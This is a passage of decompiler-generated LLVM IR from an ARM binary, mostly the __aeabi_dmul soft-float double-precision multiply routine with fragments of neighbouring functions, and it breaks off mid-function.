  %v0_1c308 = phi i32 [ %v1_1c304, %bb3 ], [ %v2_1c304, %bb4 ]
  %not. = icmp slt i32 %v0_1c2e4, 0
  %v4_1c308 = zext i1 %not. to i32
  %v5_1c308 = add nsw i32 %v0_1c308, %v4_1c308
  %v1_1c30c = sub nsw i32 32, %v5_1c308
  %v0_1c310 = load i32, i32* %r1.global-to-local, align 4
  %v6_1c310 = shl i32 %v0_1c310, %v1_1c30c
  store i32 %v6_1c310, i32* @ip, align 4
  %v6_1c314 = lshr i32 %v0_1c310, %v5_1c308
  %v1_1c318 = load i32, i32* %r0.global-to-local, align 4
  %v7_1c318 = shl i32 %v1_1c318, %v1_1c30c
  %v8_1c318 = or i32 %v7_1c318, %v6_1c314
  store i32 %v8_1c318, i32* %r1.global-to-local, align 4
  %v6_1c31c = lshr i32 %v1_1c318, %v5_1c308
  store i32 %v6_1c31c, i32* %r0.global-to-local, align 4
  %v0_1c320 = load i32, i32* %r4.global-to-local, align 4
  %v2_1c320 = add i32 %v0_1c320, %v5_1c308
  store i32 %v2_1c320, i32* @r4, align 4
  %v4_1c324 = sext i32 %v8_1c318 to i64
  %v5_1c324 = call i32 @function_1c020(i32 %v6_1c31c, i64 %v4_1c324, i32 %v5_1c308, i32 %v1_1c30c)
  store i32 %v5_1c324, i32* %r0.global-to-local, align 4
  ret i32 %v5_1c324

; uselistorder directives
  uselistorder i32 %v5_1c308, { 2, 0, 1, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 1, 2 }
  uselistorder i32 6, { 1, 24, 25, 26, 18, 19, 2, 27, 28, 3, 4, 30, 5, 6, 29, 0, 7, 8, 9, 10, 11, 20, 21, 12, 14, 15, 16, 17, 13, 22, 23 }
  uselistorder i32 3, { 68, 17, 53, 83, 54, 27, 28, 84, 22, 85, 86, 23, 87, 88, 13, 89, 0, 30, 29, 55, 3, 2, 1, 4, 90, 31, 5, 6, 14, 7, 8, 56, 57, 99, 58, 59, 60, 61, 62, 63, 91, 11, 32, 92, 33, 76, 34, 77, 35, 78, 36, 79, 37, 80, 12, 69, 100, 18, 96, 97, 24, 95, 15, 94, 16, 93, 9, 10, 64, 25, 65, 26, 98, 66, 38, 70, 39, 40, 71, 41, 20, 42, 72, 73, 21, 74, 43, 75, 44, 67, 46, 45, 52, 47, 81, 82, 48, 49, 50, 51, 19 }
  uselistorder label %bb5, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__aeabi_dmul(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1c328 = load i32, i32* @r4, align 4
  store i32 %v3_1c328, i32* %stack_var_-16, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v4_1c334 = udiv i32 %arg1, 1048576
  %v5_1c334 = urem i32 %v4_1c334, 2048
  store i32 %v5_1c334, i32* %r4.global-to-local, align 4
  %v6_1c334 = icmp eq i32 %v5_1c334, 0
  br i1 %v6_1c334, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v5_1c338 = udiv i32 %arg3, 1048576
  %v6_1c338 = urem i32 %v5_1c338, 2048
  store i32 %v6_1c338, i32* @r5, align 4
  %v7_1c338 = icmp eq i32 %v6_1c338, 0
  br i1 %v7_1c338, label %.thread1, label %bb41

bb41:                                             ; preds = %bb
  %v5_1c33c = icmp eq i32 %v5_1c334, 2047
  br i1 %v5_1c33c, label %.thread1, label %bb42

bb42:                                             ; preds = %bb41
  %v5_1c340 = icmp eq i32 %v6_1c338, 2047
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb, %bb41, %bb42
  %v0_1c344 = phi i1 [ true, %bb ], [ true, %bb41 ], [ %v5_1c340, %bb42 ], [ true, %entry ]
  store i32 115528, i32* %lr.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %v0_1c344, i32 ptrtoint (i32* @global_var_1c5c4.1691 to i32))
  %v0_1c348 = load i32, i32* %r4.global-to-local, align 4
  %v1_1c348 = load i32, i32* @r5, align 4
  %v2_1c348 = add i32 %v1_1c348, %v0_1c348
  store i32 %v2_1c348, i32* %r4.global-to-local, align 4
  %v2_1c34c = xor i32 %arg3, %arg1
  %v1_1c350 = load i32, i32* %ip.global-to-local, align 4
  %tmp = mul i32 %v1_1c350, -2097152
  %v5_1c350 = add i32 %tmp, -1
  %v6_1c350 = and i32 %v5_1c350, %arg1
  store i32 %v6_1c350, i32* %r0.global-to-local, align 4
  %v6_1c354 = and i32 %v5_1c350, %arg3
  store i32 %v6_1c354, i32* %r2.global-to-local, align 4
  %v4_1c358 = mul i32 %arg1, 4096
  %v5_1c358 = or i32 %v4_1c358, %arg2
  %v7_1c358 = icmp eq i32 %v5_1c358, 0
  br i1 %v7_1c358, label %.thread, label %bb43

.thread:                                          ; preds = %.thread1
  %v1_1c36017 = or i32 %v6_1c350, 1048576
  store i32 %v1_1c36017, i32* %r0.global-to-local, align 4
  %v1_1c36418 = or i32 %v6_1c354, 1048576
  store i32 %v1_1c36418, i32* %r2.global-to-local, align 4
  %v1_1c49c19 = and i32 %v2_1c34c, -2147483648
  br label %dec_label_pc_1c49c

bb43:                                             ; preds = %.thread1
  %v5_1c35c = mul i32 %arg3, 4096
  %v6_1c35c = or i32 %v5_1c35c, %arg4
  %v8_1c35c = icmp eq i32 %v6_1c35c, 0
  %v1_1c360 = or i32 %v6_1c350, 1048576
  store i32 %v1_1c360, i32* %r0.global-to-local, align 4
  %v1_1c364 = or i32 %v6_1c354, 1048576
  store i32 %v1_1c364, i32* %r2.global-to-local, align 4
  %v1_1c49c = and i32 %v2_1c34c, -2147483648
  br i1 %v8_1c35c, label %dec_label_pc_1c49c, label %dec_label_pc_1c36c

dec_label_pc_1c36c:                               ; preds = %bb43
  store i32 %v1_1c49c, i32* %stack_var_-40, align 4
  %v9_1c370 = load i32, i32* @r8, align 4
  %v12_1c370 = load i32, i32* @sb, align 4
  %v3_1c374 = udiv i32 %arg2, 65536
  %v3_1c378 = udiv i32 %arg4, 65536
  store i32 %v3_1c378, i32* %r8.global-to-local, align 4
  %v3_1c37c = udiv i32 %v1_1c360, 65536
  store i32 %v3_1c37c, i32* %sb.global-to-local, align 4
  %v3_1c380 = udiv i32 %v1_1c364, 65536
  %tmp59 = mul i32 %v3_1c374, -65536
  %v5_1c384 = add i32 %tmp59, -1
  %v6_1c384 = and i32 %v5_1c384, %arg2
  store i32 %v6_1c384, i32* %r1.global-to-local, align 4
  %tmp60 = mul i32 %v3_1c378, -65536
  %v5_1c388 = add i32 %tmp60, -1
  %v6_1c388 = and i32 %v5_1c388, %arg4
  %tmp61 = mul i32 %v3_1c37c, -65536
  %v5_1c38c = add i32 %tmp61, -1
  %v6_1c38c = and i32 %v6_1c350, %v5_1c38c
  store i32 %v6_1c38c, i32* %r0.global-to-local, align 4
  %tmp62 = mul i32 %v3_1c380, -65536
  %v5_1c390 = add i32 %tmp62, -1
  %v6_1c390 = and i32 %v6_1c354, %v5_1c390
  store i32 %v6_1c390, i32* %r2.global-to-local, align 4
  %v2_1c394 = mul i32 %v6_1c388, %v6_1c384
  %v2_1c398 = mul i32 %v3_1c378, %v6_1c384
  %v2_1c3a4 = and i32 %v2_1c398, 32768
  %v3_1c3a4 = icmp ne i32 %v2_1c3a4, 0
  %v4_1c3a4 = udiv i32 %v2_1c398, 65536
  %v7_1c3a4 = zext i1 %v3_1c3a4 to i32
  %v2_1c3a8 = mul i32 %v6_1c388, %v3_1c374
  %tmp53 = add i32 %v2_1c3a8, %v2_1c398
  %tmp54 = mul i32 %tmp53, 65536
  %v5_1c3ac = add i32 %tmp54, %v2_1c394
  store i32 %v5_1c3ac, i32* %ip.global-to-local, align 4
  %v2_1c3b0 = and i32 %v2_1c3a8, 32768
  %v3_1c3b0 = icmp ne i32 %v2_1c3b0, 0
  %v4_1c3b0 = udiv i32 %v2_1c3a8, 65536
  %v7_1c3b0 = zext i1 %v3_1c3b0 to i32
  %v2_1c3b4 = mul i32 %v3_1c380, %v6_1c384
  %v2_1c3c0 = and i32 %v2_1c3b4, 32768
  %v3_1c3c0 = icmp ne i32 %v2_1c3c0, 0
  %v4_1c3c0 = udiv i32 %v2_1c3b4, 65536
  %v7_1c3c0 = zext i1 %v3_1c3c0 to i32
  %v8_1c3c0 = add nuw nsw i32 %v7_1c3c0, %v4_1c3c0
  %v2_1c3c4 = mul i32 %v6_1c390, %v3_1c374
  %v2_1c3cc = and i32 %v2_1c3c4, 32768
  %v3_1c3cc = icmp ne i32 %v2_1c3cc, 0
  %v4_1c3cc = udiv i32 %v2_1c3c4, 65536
  %v6_1c3cc = add nuw nsw i32 %v8_1c3c0, %v4_1c3cc
  %v7_1c3cc = zext i1 %v3_1c3cc to i32
  %v8_1c3cc = add nuw nsw i32 %v6_1c3cc, %v7_1c3cc
  %v2_1c3d0 = mul i32 %v3_1c378, %v6_1c38c
  %v2_1c3d8 = and i32 %v2_1c3d0, 32768
  %v3_1c3d8 = icmp ne i32 %v2_1c3d8, 0
  %v4_1c3d8 = udiv i32 %v2_1c3d0, 65536
  %v6_1c3d8 = add nuw nsw i32 %v8_1c3cc, %v4_1c3d8
  %v7_1c3d8 = zext i1 %v3_1c3d8 to i32
  %v8_1c3d8 = add nuw nsw i32 %v6_1c3d8, %v7_1c3d8
  %v2_1c3dc = mul i32 %v6_1c388, %v3_1c37c
  %v4_1c3e0 = mul i32 %v2_1c3dc, 65536
  %tmp55 = add i32 %v2_1c3c4, %v2_1c3b4
  %tmp56 = add i32 %tmp55, %v2_1c3d0
  %tmp57 = mul i32 %tmp56, 65536
  %v8_1c3b0 = add nuw nsw i32 %v7_1c3a4, %v4_1c3a4
  %v5_1c3bc = add nuw nsw i32 %v8_1c3b0, %v4_1c3b0
  %v5_1c3c8 = add nuw nsw i32 %v5_1c3bc, %v7_1c3b0
  %v5_1c3d4 = add i32 %v5_1c3c8, %v4_1c3e0
  %v5_1c3e0 = add i32 %v5_1c3d4, %tmp57
  %v2_1c3e4 = and i32 %v2_1c3dc, 32768
  %v3_1c3e4 = icmp ne i32 %v2_1c3e4, 0
  %v4_1c3e4 = udiv i32 %v2_1c3dc, 65536
  %v6_1c3e4 = add nuw nsw i32 %v8_1c3d8, %v4_1c3e4
  %v7_1c3e4 = zext i1 %v3_1c3e4 to i32
  %v8_1c3e4 = add i32 %v6_1c3e4, %v7_1c3e4
  %v2_1c3e8 = mul i32 %v3_1c380, %v6_1c38c
  %v2_1c3ec = mul nuw i32 %v3_1c380, %v3_1c37c
  %v4_1c3f0 = mul i32 %v2_1c3e8, 65536
  %v5_1c3f0 = add i32 %v8_1c3e4, %v4_1c3f0
  %v2_1c3f4 = and i32 %v2_1c3e8, 32768
  %v3_1c3f4 = icmp ne i32 %v2_1c3f4, 0
  %v4_1c3f4 = udiv i32 %v2_1c3e8, 65536
  %v6_1c3f4 = add i32 %v4_1c3f4, %v2_1c3ec
  %v7_1c3f4 = zext i1 %v3_1c3f4 to i32
  %v2_1c3f8 = mul i32 %v6_1c390, %v3_1c37c
  %v4_1c3fc = mul i32 %v2_1c3f8, 65536
  %v5_1c3fc = add i32 %v5_1c3f0, %v4_1c3fc
  %v2_1c400 = and i32 %v2_1c3f8, 32768
  %v3_1c400 = icmp ne i32 %v2_1c400, 0
  %v4_1c400 = udiv i32 %v2_1c3f8, 65536
  %v7_1c400 = zext i1 %v3_1c400 to i32
  %v2_1c404 = mul i32 %v6_1c384, %v6_1c390
  %v2_1c408 = add i32 %v2_1c404, %v5_1c3e0
  %v3_1c408 = icmp ult i32 %v2_1c408, %v5_1c3e0
  %v2_1c40c = mul nuw i32 %v3_1c374, %v3_1c380
  %v3_1c410 = add i32 %v5_1c3fc, %v2_1c40c
  %v4_1c410 = zext i1 %v3_1c408 to i32
  %v5_1c410 = add i32 %v4_1c410, %v3_1c410
  %v9_1c410 = icmp ule i32 %v5_1c410, %v5_1c3fc
  %v10_1c410 = icmp ult i32 %v3_1c410, %v5_1c3fc
  %v11_1c410 = select i1 %v3_1c408, i1 %v9_1c410, i1 %v10_1c410
  %v2_1c414 = mul i32 %v6_1c388, %v6_1c38c
  %v2_1c418 = zext i1 %v11_1c410 to i32
  %v2_1c41c = add i32 %v2_1c414, %v2_1c408
  %v3_1c41c = icmp ult i32 %v2_1c41c, %v2_1c408
  %v0_1c420 = load i32, i32* %sb.global-to-local, align 4
  %v1_1c420 = load i32, i32* %r8.global-to-local, align 4
  %v2_1c420 = mul i32 %v1_1c420, %v0_1c420
  %v3_1c424 = add i32 %v2_1c420, %v5_1c410
  %v4_1c424 = zext i1 %v3_1c41c to i32
  %v5_1c424 = add i32 %v4_1c424, %v3_1c424
  %v9_1c424 = icmp ule i32 %v5_1c424, %v5_1c410
  %v10_1c424 = icmp ult i32 %v3_1c424, %v5_1c410
  %v11_1c424 = select i1 %v3_1c41c, i1 %v9_1c424, i1 %v10_1c424
  %v2_1c428 = mul i32 %v1_1c420, %v3_1c374
  %v2_1c42c = zext i1 %v11_1c424 to i32
  %v8_1c3f4 = add i32 %v6_1c3f4, %v4_1c400
  %v6_1c400 = add i32 %v8_1c3f4, %v7_1c3f4
  %v8_1c400 = add i32 %v6_1c400, %v7_1c400
  %v3_1c418 = add i32 %v8_1c400, %v2_1c418
  %v3_1c42c = add i32 %v3_1c418, %v2_1c42c
  %v2_1c430 = add i32 %v2_1c428, %v2_1c41c
  store i32 %v2_1c430, i32* %lr.global-to-local, align 4
  %v3_1c430 = icmp ult i32 %v2_1c430, %v2_1c41c
  %v1_1c434 = load i32, i32* %r2.global-to-local, align 4
  %v2_1c434 = mul i32 %v1_1c434, %v6_1c38c
  %v3_1c438 = add i32 %v5_1c424, %v2_1c434
  %v4_1c438 = zext i1 %v3_1c430 to i32
  %v5_1c438 = add i32 %v4_1c438, %v3_1c438
  %v9_1c438 = icmp ule i32 %v5_1c438, %v5_1c424
  %v10_1c438 = icmp ult i32 %v3_1c438, %v5_1c424
  %v11_1c438 = select i1 %v3_1c430, i1 %v9_1c438, i1 %v10_1c438
  %v2_1c43c = zext i1 %v11_1c438 to i32
  %v3_1c43c = add i32 %v2_1c43c, %v3_1c42c
  %v2_1c440 = load i32, i32* %stack_var_-40, align 4
  store i32 %v9_1c370, i32* %r8.global-to-local, align 4
  store i32 %v12_1c370, i32* %sb.global-to-local, align 4
  %v0_1c444 = load i32, i32* %ip.global-to-local, align 4
  %v2_1c444 = icmp eq i32 %v0_1c444, 0
  br i1 %v2_1c444, label %bb45, label %bb44

bb44:                                             ; preds = %dec_label_pc_1c36c
  %v2_1c448 = or i32 %v2_1c430, 1
  store i32 %v2_1c448, i32* %lr.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_1c36c, %bb44
  %v0_1c45c = phi i32 [ %v2_1c430, %dec_label_pc_1c36c ], [ %v2_1c448, %bb44 ]
  %v0_1c44c = load i32, i32* %r4.global-to-local, align 4
  %v1_1c44c = add i32 %v0_1c44c, -255
  %v2_1c450 = icmp ugt i32 %v3_1c43c, 511
  %v2_1c454 = icmp eq i1 %v2_1c450, false
  %v5_1c454 = sext i1 %v2_1c454 to i32
  %v3_1c454 = add nsw i32 %v5_1c454, -1023
  %v6_1c454 = add i32 %v3_1c454, %v0_1c44c
  store i32 %v6_1c454, i32* %r4.global-to-local, align 4
  %v3_1c458 = icmp ugt i32 %v1_1c44c, 768
  br i1 %v3_1c458, label %dec_label_pc_1c468, label %dec_label_pc_1c45c

dec_label_pc_1c45c:                               ; preds = %bb45
  %v1_1c45c = icmp slt i32 %v0_1c45c, 0
  %v2_1c45c = mul i32 %v0_1c45c, 2
  store i32 %v2_1c45c, i32* %lr.global-to-local, align 4
  %v3_1c460 = mul i32 %v5_1c438, 2
  %v4_1c460 = zext i1 %v1_1c45c to i32
  %v5_1c460 = or i32 %v4_1c460, %v3_1c460
  %v9_1c460 = icmp ule i32 %v5_1c460, %v5_1c438
  %v10_1c460 = icmp ult i32 %v3_1c460, %v5_1c438
  %v11_1c460 = select i1 %v1_1c45c, i1 %v9_1c460, i1 %v10_1c460
  %v3_1c464 = mul i32 %v3_1c43c, 2
  %v4_1c464 = zext i1 %v11_1c460 to i32
  %v5_1c464 = or i32 %v4_1c464, %v3_1c464
  br label %dec_label_pc_1c468

dec_label_pc_1c468:                               ; preds = %bb45, %dec_label_pc_1c45c
  %v0_1c478 = phi i32 [ %v0_1c45c, %bb45 ], [ %v2_1c45c, %dec_label_pc_1c45c ]
  %v0_1c470 = phi i32 [ %v5_1c438, %bb45 ], [ %v5_1c460, %dec_label_pc_1c45c ]
  %v1_1c468 = phi i32 [ %v3_1c43c, %bb45 ], [ %v5_1c464, %dec_label_pc_1c45c ]
  %v4_1c468 = mul i32 %v1_1c468, 2048
  %v4_1c46c = udiv i32 %v0_1c470, 2097152
  %v5_1c468 = or i32 %v4_1c46c, %v2_1c440
  %v5_1c46c = or i32 %v5_1c468, %v4_1c468
  store i32 %v5_1c46c, i32* %r0.global-to-local, align 4
  %v3_1c470 = mul i32 %v0_1c470, 2048
  %v4_1c474 = udiv i32 %v0_1c478, 2097152
  %v5_1c474 = or i32 %v3_1c470, %v4_1c474
  store i32 %v5_1c474, i32* %r1.global-to-local, align 4
  %v3_1c478 = mul i32 %v0_1c478, 2048
  store i32 %v3_1c478, i32* %lr.global-to-local, align 4
  %v1_1c47c = add i32 %v6_1c454, -253
  store i32 %v1_1c47c, i32* %ip.global-to-local, align 4
  %v2_1c47c = icmp ugt i32 %v6_1c454, 252
  %v7_1c47c = icmp eq i32 %v6_1c454, 253
  %v2_1c480 = xor i1 %v7_1c47c, true
  %v3_1c480 = and i1 %v2_1c47c, %v2_1c480
  br i1 %v3_1c480, label %bb46, label %bb47

bb46:                                             ; preds = %dec_label_pc_1c468
  %v6_1c480 = icmp ugt i32 %v1_1c47c, 1791
  %v11_1c480 = icmp eq i32 %v1_1c47c, 1792
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_1c468, %bb46
  %v1_1c484 = phi i1 [ %v7_1c47c, %dec_label_pc_1c468 ], [ %v11_1c480, %bb46 ]
  %v0_1c484 = phi i1 [ %v2_1c47c, %dec_label_pc_1c468 ], [ %v6_1c480, %bb46 ]
  %v2_1c484 = xor i1 %v1_1c484, true
  %v3_1c484 = and i1 %v0_1c484, %v2_1c484
  call void @__pseudo_cond_branch(i1 %v3_1c484, i32 ptrtoint (i32* @global_var_1c4c8.1692 to i32))
  %v0_1c488 = load i32, i32* %lr.global-to-local, align 4
  %v2_1c488 = icmp slt i32 %v0_1c488, 0
  %v6_1c488 = icmp eq i32 %v0_1c488, -2147483648
  %v1_1c48c = load i32, i32* %r1.global-to-local, align 4
  br i1 %v6_1c488, label %bb48, label %._crit_edge

bb48:                                             ; preds = %bb47
  %v2_1c48c = urem i32 %v1_1c48c, 2
  %v3_1c48c = icmp ne i32 %v2_1c48c, 0
  %v4_1c48c = udiv i32 %v1_1c48c, 2
  store i32 %v4_1c48c, i32* %lr.global-to-local, align 4
  br label %._crit_edge

._crit_edge:                                      ; preds = %bb47, %bb48
  %v1_1c490 = phi i1 [ %v3_1c48c, %bb48 ], [ %v2_1c488, %bb47 ]
  %v2_1c490 = zext i1 %v1_1c490 to i32
  %v3_1c490 = add i32 %v2_1c490, %v1_1c48c
  store i32 %v3_1c490, i32* %r1.global-to-local, align 4
  %v0_1c494 = load i32, i32* %r0.global-to-local, align 4
  %v1_1c494 = load i32, i32* %r4.global-to-local, align 4
  %v2_1c494 = and i32 %v1_1c494, 4096
  %v3_1c494 = icmp ne i32 %v2_1c494, 0
  %v4_1c494 = mul i32 %v1_1c494, 1048576
  %v6_1c494 = add i32 %v4_1c494, %v0_1c494
  %v7_1c494 = zext i1 %v3_1c494 to i32
  %v8_1c494 = add i32 %v7_1c494, %v6_1c494
  store i32 %v8_1c494, i32* %r0.global-to-local, align 4
  %v2_1c498 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1c498, i32* %r4.global-to-local, align 4
  ret i32 %v8_1c494

dec_label_pc_1c49c:                               ; preds = %.thread, %bb43
  %v1_1c49c22 = phi i32 [ %v1_1c49c19, %.thread ], [ %v1_1c49c, %bb43 ]
  %v1_1c36421 = phi i32 [ %v1_1c36418, %.thread ], [ %v1_1c364, %bb43 ]
  %v1_1c36020 = phi i32 [ %v1_1c36017, %.thread ], [ %v1_1c360, %bb43 ]
  %v2_1c4a0 = or i32 %v1_1c36020, %v1_1c49c22
  %v2_1c4a4 = or i32 %arg4, %arg2
  store i32 %v2_1c4a4, i32* %r1.global-to-local, align 4
  %v2_1c4a8 = xor i32 %v2_1c4a0, %v1_1c36421
  store i32 %v2_1c4a8, i32* %r0.global-to-local, align 4
  %v4_1c4ac = udiv i32 %v1_1c350, 2
  %v5_1c4ac = sub i32 %v2_1c348, %v4_1c4ac
  store i32 %v5_1c4ac, i32* %r4.global-to-local, align 4
  %v7_1c4ac = sub i32 0, %v5_1c4ac
  %v8_1c4ac = and i32 %v2_1c348, %v7_1c4ac
  %v11_1c4ac = icmp eq i32 %v2_1c348, %v4_1c4ac
  %v7_1c4b0 = icmp sgt i32 %v2_1c348, %v4_1c4ac
  br i1 %v7_1c4b0, label %bb49, label %bb50

bb49:                                             ; preds = %dec_label_pc_1c49c
  %v10_1c4b0 = sub i32 %v1_1c350, %v5_1c4ac
  %v12_1c4b0 = xor i32 %v5_1c4ac, %v1_1c350
  %v13_1c4b0 = xor i32 %v10_1c4b0, %v1_1c350
  %v14_1c4b0 = and i32 %v13_1c4b0, %v12_1c4b0
  %v17_1c4b0 = icmp eq i32 %v1_1c350, %v5_1c4ac
  br label %bb50

bb50:                                             ; preds = %dec_label_pc_1c49c, %bb49
  %v2_1c4b8.in = phi i32 [ %v8_1c4ac, %dec_label_pc_1c49c ], [ %v14_1c4b0, %bb49 ]
  %v1_1c4b8.in = phi i32 [ %v5_1c4ac, %dec_label_pc_1c49c ], [ %v10_1c4b0, %bb49 ]
  %v0_1c4b8 = phi i1 [ %v11_1c4ac, %dec_label_pc_1c49c ], [ %v17_1c4b0, %bb49 ]
  %v1_1c4b8 = icmp slt i32 %v1_1c4b8.in, 0
  %v2_1c4b8 = icmp slt i32 %v2_1c4b8.in, 0
  %v3_1c4b4 = xor i1 %v2_1c4b8, %v1_1c4b8
  %v4_1c4b4 = or i1 %v0_1c4b8, %v3_1c4b4
  br i1 %v4_1c4b4, label %bb52, label %bb51

bb51:                                             ; preds = %bb50
  %v9_1c4b428 = mul i32 %v5_1c4ac, 1048576
  %v10_1c4b429 = or i32 %v2_1c4a8, %v9_1c4b428
  store i32 %v10_1c4b429, i32* %r0.global-to-local, align 4
  %v7_1c4b8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v7_1c4b8, i32* %r4.global-to-local, align 4
  ret i32 %v10_1c4b429

bb52:                                             ; preds = %bb50
  %v1_1c4bc = or i32 %v2_1c4a8, 1048576
  store i32 %v1_1c4bc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v1_1c4c4 = add i32 %v5_1c4ac, -1
  store i32 %v1_1c4c4, i32* %r4.global-to-local, align 4
  ret i32 %v1_1c4bc

; uselistorder directives
  uselistorder i32 %v5_1c4ac, { 4, 1, 0, 6, 3, 5, 2, 7 }
  uselistorder i32 %v4_1c4ac, { 2, 1, 0 }
  uselistorder i32 %v2_1c4a8, { 1, 0, 2 }
  uselistorder i32 %v1_1c48c, { 2, 0, 1 }
  uselistorder i32 %v0_1c488, { 1, 0 }
  uselistorder i1 %v7_1c47c, { 1, 0 }
  uselistorder i32 %v2_1c45c, { 1, 0 }
  uselistorder i1 %v1_1c45c, { 1, 0 }
  uselistorder i32 %v6_1c454, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1c45c, { 1, 0, 2 }
  uselistorder i32 %v3_1c43c, { 1, 0, 2 }
  uselistorder i32 %v5_1c438, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v3_1c438, { 1, 0 }
  uselistorder i1 %v3_1c430, { 1, 0 }
  uselistorder i32 %v5_1c424, { 1, 0, 2, 3 }
  uselistorder i32 %v3_1c424, { 1, 0 }
  uselistorder i1 %v3_1c41c, { 1, 0 }
  uselistorder i32 %v2_1c41c, { 1, 0, 2 }
  uselistorder i32 %v5_1c410, { 2, 1, 0, 3 }
  uselistorder i32 %v3_1c410, { 1, 0 }
  uselistorder i1 %v3_1c408, { 1, 0 }
  uselistorder i32 %v2_1c408, { 1, 0, 2 }
  uselistorder i32 %v5_1c3fc, { 2, 1, 0 }
  uselistorder i32 %v2_1c3f8, { 1, 2, 0 }
  uselistorder i32 %v2_1c3e8, { 0, 2, 1 }
  uselistorder i32 %v5_1c3e0, { 1, 0 }
  uselistorder i32 %v2_1c3dc, { 1, 2, 0 }
  uselistorder i32 %v2_1c3d0, { 1, 0, 2 }
  uselistorder i32 %v2_1c3c4, { 1, 0, 2 }
  uselistorder i32 %v2_1c3b4, { 1, 0, 2 }
  uselistorder i32 %v2_1c3a8, { 0, 2, 1 }
  uselistorder i32 %v2_1c398, { 1, 0, 2 }
  uselistorder i32 %v6_1c390, { 1, 0, 2, 3 }
  uselistorder i32 %v6_1c38c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v6_1c384, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_1c380, { 2, 3, 4, 1, 0 }
  uselistorder i32 %v3_1c37c, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v3_1c378, { 3, 2, 0, 1 }
  uselistorder i32 %v3_1c374, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v1_1c364, { 1, 0, 2 }
  uselistorder i32 %v1_1c360, { 1, 0, 2 }
  uselistorder i32 %v6_1c354, { 0, 2, 1, 3 }
  uselistorder i32 %v6_1c350, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1c350, { 5, 2, 3, 4, 1, 0 }
  uselistorder i32 %v2_1c34c, { 1, 0 }
  uselistorder i32 %v2_1c348, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v6_1c338, { 2, 1, 0 }
  uselistorder i32 %v5_1c334, { 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 1, 5, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 4, 5, 6, 7, 8, 9, 1, 10, 0 }
  uselistorder i32 32768, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 13, 1, 12 }
  uselistorder i32 65536, { 2, 0, 3, 93, 4, 94, 1, 5, 6, 7, 8, 95, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 30, 26, 31, 27, 32, 28, 33, 29, 34, 35, 36, 40, 37, 41, 38, 42, 39, 43, 45, 44, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 87, 88, 86, 90, 91, 89, 92, 96 }
  uselistorder i32* @sb, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 1, 2, 16, 17, 18, 19, 20, 21, 22, 23, 24, 32, 33, 34, 35, 36, 37, 25, 26, 27, 28, 29, 30, 0, 31 }
  uselistorder i32* @r8, { 20, 21, 22, 23, 24, 25, 26, 27, 5, 6, 7, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 1, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 0, 67, 68, 69, 70, 71, 2, 72, 73, 74, 75, 92, 93, 8, 9, 91, 85, 86, 87, 88, 89, 90, 76, 77, 78, 79, 80, 81, 82, 3, 4, 83, 84, 16, 17, 18, 19, 10, 11, 12, 13, 14, 15 }
  uselistorder i32 %arg4, { 1, 2, 0, 3 }
  uselistorder i32 %arg3, { 0, 2, 3, 1, 4 }
  uselistorder i32 %arg2, { 1, 2, 0, 3, 4 }
  uselistorder i32 %arg1, { 0, 2, 3, 1, 4 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_1c49c, { 1, 0 }
  uselistorder label %._crit_edge, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_1c468, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %.thread1, { 3, 2, 1, 0 }
}

define i32 @function_1c4c8(i32 %arg1) local_unnamed_addr {
dec_label_pc_1c4c8:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %v0_1c4c8 = load i1, i1* @cpsr_z, align 1
  %v1_1c4c8 = load i1, i1* @cpsr_n, align 1
  %v2_1c4c8 = load i1, i1* @cpsr_v, align 1
  %v3_1c4c8 = xor i1 %v1_1c4c8, %v2_1c4c8
